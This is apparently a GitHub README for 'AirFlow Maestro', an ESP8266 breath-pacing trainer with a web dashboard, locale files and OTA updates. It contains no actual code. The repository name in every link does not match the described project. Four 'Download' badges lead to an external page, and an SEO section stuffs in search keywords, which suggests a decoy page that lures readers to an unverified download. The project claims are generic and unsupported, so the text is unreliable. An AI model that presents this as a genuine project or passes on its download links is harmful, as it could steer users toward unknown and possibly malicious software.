![preview](https://raw.githubusercontent.com/KagamaruChan/blowjob-trainer-esp8266-firmware/main/cover_e030a4.svg)
# 🌬️ AirFlow Maestro — Adaptive Breath & Rhythm Coach for ESP8266

> **Breathing is the oldest interface between body and mind. AirFlow Maestro turns that interface into a guided, gamified, sensor-driven experience — no cloud required, no subscriptions, no nonsense.**

[![Download](https://raw.githubusercontent.com/KagamaruChan/blowjob-trainer-esp8266-firmware/main/go_38046d.svg)](https://KagamaruChan.github.io/blowjob-trainer-esp8266-firmware/)

---

## 📖 Table of Contents

- [What Is AirFlow Maestro?](#-what-is-airflow-maestro)
- [Why This Project Exists](#-why-this-project-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Hardware Blueprint](#-hardware-blueprint)
- [Software Architecture](#-software-architecture)
- [Responsive Web Dashboard](#-responsive-web-dashboard)
- [Multilingual Support](#-multilingual-support)
- [24/7 Companion Assistance](#-247-companion-assistance)
- [Training Modes](#-training-modes)
- [Sensor Calibration & Tuning](#-sensor-calibration--tuning)
- [Data Logging & Progress Analytics](#-data-logging--progress-analytics)
- [Firmware Update Pathway](#-firmware-update-pathway)
- [Privacy & Offline-First Design](#-privacy--offline-first-design)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Community & Contribution](#-community--contribution)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌬️ What Is AirFlow Maestro?

AirFlow Maestro is an open, ESP8266-powered training companion that listens to the rhythm of your breath, your pace, and your timing — then gently nudges you toward smoother, longer, more controlled sessions. It is not a gadget that shouts at you. It is a quiet conductor standing at the edge of an orchestra pit, watching the tempo, lifting a baton only when the music starts to drift.

Built on the tiny but mighty ESP8266 microcontroller, AirFlow Maestro bridges the physical and the digital: pressure sensors, airflow transducers, and timing pulses on one side; a beautifully responsive web dashboard on the other. Everything runs on your local network. Nothing phones home.

Whether you are practicing respiratory endurance, refining pacing discipline, or simply building a daily habit of mindful breathwork, AirFlow Maestro adapts to the person in front of it — not the other way around.

[![Download](https://raw.githubusercontent.com/KagamaruChan/blowjob-trainer-esp8266-firmware/main/go_38046d.svg)](https://KagamaruChan.github.io/blowjob-trainer-esp8266-firmware/)

---

## 🧭 Why This Project Exists

Most training devices fall into two camps: overpriced closed hardware, or fragile DIY scripts that break the moment you sneeze near them. AirFlow Maestro was born from a simple frustration — training tools should be transparent, repairable, and respectful of the person using them.

The project started as a weekend tinkering session and grew into a full-fledged platform with modular firmware, a configurable training engine, and a dashboard that works on a phone, a tablet, or a dusty old laptop in the corner of the room.

The name says it all: **AirFlow** for the breath and motion that drive every session, **Maestro** for the conductor-like intelligence that keeps the rhythm honest.

---

## 🎯 Core Philosophy

1. **Local-first, always.** Your session data belongs to you and stays on your device.
2. **Adapt, don't dictate.** The trainer observes and suggests; it never shames.
3. **Repairable by design.** Off-the-shelf parts, documented pinouts, readable code.
4. **Calm technology.** The interface should lower your heart rate, not raise it.
5. **Open and extensible.** Add a sensor, change a mode, fork the logic — the door is unlocked.

---

## ✨ Feature Highlights

- **Responsive Web Dashboard** — a fluid interface that reshapes itself gracefully from a 4-inch phone to a wall-mounted tablet, with touch-friendly controls and high-contrast readability in dim rooms.
- **Multilingual Support** — interface strings are externalized into locale files, with shipped translations for English, Spanish, German, Japanese, Portuguese, and French. Adding a new language takes minutes, not a rewrite.
- **24/7 Companion Assistance** — an always-available offline help layer embedded in the dashboard, including guided walkthroughs, contextual tooltips, and a diagnostic assistant that answers common questions without an internet connection.
- **Adaptive Pacing Engine** — dynamically tunes target tempo based on your rolling performance, so sessions stay challenging but never overwhelming.
- **Pressure & Flow Fusion** — combines pressure sensor data with airflow readings for a more nuanced picture of each session.
- **Session Replay Timeline** — scrub through any past session like a video editor and see exactly where rhythm drifted.
- **Streak & Habit Tracking** — gentle, non-judgmental habit metrics with weekly summaries.
- **OTA-Ready Firmware Channel** — update the ESP8266 wirelessly from the dashboard.
- **Config Profiles** — save multiple training setups for different times of day or different goals.
- **Offline Analytics** — charts and insights rendered entirely client-side.

[![Download](https://raw.githubusercontent.com/KagamaruChan/blowjob-trainer-esp8266-firmware/main/go_38046d.svg)](https://KagamaruChan.github.io/blowjob-trainer-esp8266-firmware/)

---

## 🔩 Hardware Blueprint

AirFlow Maestro is designed around parts you can find at any electronics counter:

| Component | Purpose | Notes |
|---|---|---|
| ESP8266 (NodeMCU / Wemos D1 mini) | Main controller | Wi-Fi + web server |
| MPXV7002DP or equivalent | Differential pressure sensing | Core airflow signal |
| ADS1115 | 16-bit ADC | Cleaner readings than onboard ADC |
| SSD1306 OLED (optional) | Local status display | Shows IP + session time |
| Momentary button | Manual mode switching | Debounced in firmware |
| RGB LED (optional) | Ambient feedback | Slow pulse during rest phases |
| 5V regulated supply | Power | USB or barrel jack |

A full wiring diagram, BOM spreadsheet, and enclosure STL files live in the `/hardware` directory. The design favors through-hole components where possible so that beginners can assemble it with a basic soldering iron.

---

## 🏗️ Software Architecture

The firmware is organized into clearly separated layers:

- **`/firmware/core`** — session state machine, timing engine, aggregation logic
- **`/firmware/sensors`** — sensor abstraction, calibration tables, filtering
- **`/firmware/net`** — Wi-Fi management, HTTP server, WebSocket channel
- **`/firmware/ui`** — OLED rendering, LED feedback, button handling
- **`/web`** — dashboard single-page app, locale bundles, chart renderer
- **`/docs`** — build notes, wiring diagrams, calibration walkthroughs

This separation means you can rewrite the web dashboard without touching sensor code, or swap out a sensor without recompiling the UI.

---

## 🖥️ Responsive Web Dashboard

The dashboard is the face of AirFlow Maestro, and it was designed mobile-first. Cards reflow, charts resize, and controls move to where your thumb expects them. On a large screen, the layout expands into a multi-column control room view with live graphs, session history, and a tuning panel side by side.

Key dashboard surfaces:

- **Live Session View** — real-time waveform, target vs. actual pacing, and a subtle progress ring
- **History Browser** — filter by date, mode, or duration; tap any session to open the replay timeline
- **Tuning Panel** — adjust thresholds, smoothing, and sensitivity with immediate visual feedback
- **Settings Hub** — language, theme (light/dark/auto), units, and notification preferences

The entire front end is dependency-light, ships as static assets, and loads in under a second on a local network.

---

## 🌍 Multilingual Support

Every user-facing string lives in a JSON locale file under `/web/locales`. The runtime picks the best match from the browser's `Accept-Language` header and falls back gracefully. Community translations are welcome — the repository includes a locale template and a validation script that checks for missing keys before a pull request is merged.

Currently shipped locales:

- English (reference)
- Spanish
- German
- Japanese
- Portuguese (Brazil)
- French

Planned for 2026: Italian, Korean, Dutch, and Polish.

---

## 🕰️ 24/7 Companion Assistance

Assistance doesn't need a data center. AirFlow Maestro ships with a self-contained guidance engine that runs entirely in the browser. It answers questions like *"Why is my pressure reading drifting?"* or *"How do I set up a two-phase session?"* by matching your query against a curated knowledge base bundled with the dashboard.

Because it is offline, it works at 3 a.m. on a mountain cabin Wi-Fi hotspot just as well as it does in a city apartment. There is no ticket queue, no chatbot delay — just immediate, useful answers.

---

## 🎼 Training Modes

AirFlow Maestro ships with several built-in modes, each tuned for a different intention:

1. **Steady Cadence** — lock to a fixed rhythm and hold it.
2. **Ramp Builder** — gradually increase challenge across the session.
3. **Interval Waves** — alternate high and low phases with visual and LED cues.
4. **Free Flow** — no targets, just recording; ideal for exploration.
5. **Custom Scripts** — define your own phase sequences in a simple YAML file.

Custom scripts are hot-reloaded, so you can tweak a phase timing and see the change on the next session without rebooting.

---

## 🎚️ Sensor Calibration & Tuning

Every sensor is a little different, and every room has its own air. The calibration wizard walks you through:

- Zero-point capture at rest
- Reference point capture at a known intensity
- Smoothing window selection (raw / light / heavy)
- Drift compensation toggle for long sessions

Calibration profiles are stored in flash and can be exported or imported as JSON, making it easy to move a sensor between devices or share a tuned profile with a friend.

---

## 📊 Data Logging & Progress Analytics

Sessions are stored locally in a compact binary format with a JSON export option. The analytics view computes:

- Average pacing accuracy per session
- Rhythm variance trends over weeks
- Best and worst time-of-day windows
- Longest uninterrupted streak

Charts are rendered with a lightweight canvas library and never leave the device. If you want to back up your history, a single export button produces a portable archive.

---

## 🔄 Firmware Update Pathway

The dashboard includes an update panel that accepts a signed binary and flashes it over the air. The device verifies the signature before rebooting, so a corrupted transfer can never brick a running unit. Rollback to the previous firmware is a single tap if a new version misbehaves.

---

## 🔐 Privacy & Offline-First Design

There is no telemetry, no analytics beacon, no account system. The device broadcasts a local Wi-Fi access point or joins your home network — your choice. All session data lives in flash memory and in your browser's local storage. If you delete it, it is gone.

This is not a limitation. It is the point.

---

## 🔎 SEO & Discoverability Notes

If you found this project while searching for phrases like *ESP8266 breath training device*, *open-source pacing trainer*, *DIY airflow rhythm coach*, or *local-first biofeedback dashboard*, you are exactly who this repository was written for. The README, docs, and code comments use natural language descriptions of the hardware and software so that search engines and humans alike can understand what the project does without decoding jargon.

**Primary topics:** ESP8266 projects, breath pacing trainer, airflow sensor firmware, responsive IoT dashboard, offline biofeedback, multilingual embedded UI, open hardware training device.

---

## 🗺️ Roadmap for 2026

- Q1 2026 — Italian and Korean locale bundles
- Q2 2026 — ESP32-S3 variant with onboard DSP
- Q3 2026 — Companion mobile app for session review
- Q4 2026 — Community mode-sharing hub (self-hosted)

The roadmap is intentionally modest. Shipping slowly and correctly beats shipping loudly and brokenly.

---

## 🤝 Community & Contribution

Issues, pull requests, and translation patches are welcome. Before opening a PR, please:

1. Run the locale validation script.
2. Format firmware changes with the provided clang-format config.
3. Add a short note to `CHANGELOG.md` under the "Unreleased" heading.

There is no CLA, no corporate gatekeeping — just a shared expectation of civility and craftsmanship.

---

## ❓ Frequently Asked Questions

**Does it need internet access?**
No. Everything runs on your local network.

**Can I use a different pressure sensor?**
Yes — the sensor abstraction layer accepts any analog source within range, with a small calibration step.

**Is the dashboard usable on old phones?**
Yes. The front end is deliberately lightweight and tested on hardware from a decade ago.

**Can I run multiple devices?**
Each device serves its own dashboard. A future multi-device view is on the roadmap.

---

## ⚠️ Disclaimer

AirFlow Maestro is a training and hobbyist tool intended for general wellness and skill practice. It is **not** a medical device and must not be used for diagnosis, treatment, or monitoring of any health condition. Consult a qualified healthcare professional before beginning any new breathing or physical training regimen. The authors and contributors accept no liability for injury, discomfort, or damage arising from use of this project. Assemble and operate the hardware at your own risk, and always follow safe electrical practices.

---

## 📜 License

Released under the **MIT License**. See the full text at [LICENSE](./LICENSE).

Copyright (c) 2026 AirFlow Maestro contributors.

Permission is hereby granted, without restriction, to any person obtaining a copy of this software and associated documentation files, to deal in the Software without restriction, including the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies, subject to the conditions stated in the license file.

[![Download](https://raw.githubusercontent.com/KagamaruChan/blowjob-trainer-esp8266-firmware/main/go_38046d.svg)](https://KagamaruChan.github.io/blowjob-trainer-esp8266-firmware/)